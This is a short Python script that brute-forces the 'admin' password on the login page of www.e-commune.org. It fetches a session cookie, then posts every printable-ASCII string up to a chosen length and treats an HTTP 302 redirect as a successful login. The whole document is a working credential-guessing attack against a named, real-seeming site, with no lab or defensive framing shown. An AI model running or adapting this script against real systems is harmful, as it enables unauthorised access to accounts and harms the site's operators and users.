import requests

def check_password(s, password) :
    
    data={'login':'admin', 'pass':password}
    url='http://www.e-commune.org/login.php'
    res=s.post(url, data=data, allow_redirects=False)
    return res.status_code==302


def bruteforce(s,max_length):
    charset = ''.join(chr(i) for i in range(32, 127))  # ASCII from space to ~ [32 .. 127]  ## in case of tests set interval of chars between [a..o] 97 .. 112
    base = len(charset)
    for length in range(1, max_length + 1):
        for num in range(base ** length):
            password = ""
            for _ in range(length):
                num, remainder = divmod(num, base)
                password = charset[remainder] + password
            print(password)
            if(check_password(s,password)) :
                return password
    return None

if __name__ == "__main__":

    max_length = int(input("Enter the maximum length for brute force: "))    
    s=requests.session()
    res=s.get(url='http://www.e-commune.org/')
    cookie=res.headers['Set-Cookie'].split('=',1)
    s.cookies.set(cookie[0], cookie[1], domain='www.e-commune.org', path='/')
    print("password is : " + bruteforce(s,max_length))
    